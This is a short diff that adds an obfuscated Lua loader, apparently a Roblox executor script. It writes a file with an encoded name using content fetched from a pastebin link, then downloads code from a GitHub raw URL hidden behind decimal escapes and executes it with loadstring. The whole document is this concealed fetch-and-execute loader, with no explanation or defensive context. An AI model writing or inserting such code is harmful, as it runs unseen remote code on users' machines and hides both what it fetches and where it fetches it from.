@@ -1,0 +1,2 @@
+local x12_9x82_32x_x222 = function(name,data)spawn(function()writefile(name, data)end)end
+x12_9x82_32x_x222("\65\117\116\111\51\70\97\114\109.\118\98\101\101",string.reverse(tostring(game:HttpGet('https://pastebin.com/raw/m6njXZRs', not false))))loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\113\117\97\100\114\97\100\111\114\47\79\80\76\47\109\97\105\110\47\65\84\70\46\108\117\97'))()
